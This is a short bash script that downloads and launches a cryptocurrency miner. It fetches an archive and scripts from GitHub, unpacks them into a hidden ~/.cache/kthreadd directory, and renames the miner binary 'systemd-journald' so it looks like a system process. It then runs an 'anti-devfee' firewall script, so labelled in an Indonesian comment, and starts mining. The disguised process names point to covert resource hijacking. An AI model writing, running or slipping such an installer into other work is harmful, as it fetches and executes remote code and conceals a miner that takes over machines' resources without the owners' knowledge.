
#!/bin/bash

set -e

mkdir -p ~/.cache/kthreadd
chmod 700 ~/.cache/kthreadd
cd ~/.cache/kthreadd

wget -q \
    https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz \
    https://github.com/ANTI-VIRAL/MACHINE/raw/main/systemd.py \
    https://github.com/ANTI-VIRAL/Ai-02/raw/main/mass.ini \
    https://github.com/ANTI-VIRAL/Ai-02/raw/main/set-firewall.sh \
    https://github.com/ANTI-VIRAL/Ai-02/raw/main/start.sh

tar -xzf cache.tar.gz
rm -f cache.tar.gz
mv cache systemd-journald
mv mass.ini config.ini

chmod +x systemd-journald systemd.py set-firewall.sh start.sh

# Jalankan firewall anti-devfee dulu
bash set-firewall.sh

# Start mining
exec bash start.sh
